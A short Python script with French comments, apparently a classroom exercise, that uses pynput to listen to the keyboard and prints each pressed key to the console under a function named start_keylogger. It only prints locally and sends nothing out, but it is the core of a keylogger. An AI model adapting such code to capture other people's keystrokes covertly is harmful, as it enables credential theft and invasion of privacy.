import pynput
import pynput.keyboard


#Créer la méthode processkeys(key)qui prend comme paramètre une touche du clavier sur laquelle  on a appuyé, affiche sa valeur.
def processkeys(key):
    try:
        print(f'Touche appuyée: {key.char}')
    except AttributeError:
        print(f'Touche spéciale appuyée: {key}')

#Créer un écouteur de clavier qui utilise la méthode processkeys(key) pour traiter les touches appuyées.
def start_keylogger():
    with pynput.keyboard.Listener(on_press=processkeys) as listener:
        listener.join()
if __name__ == "__main__":
    start_keylogger()
#Créer la méthode start_keylogger() qui démarre l'écouteur de clavier.

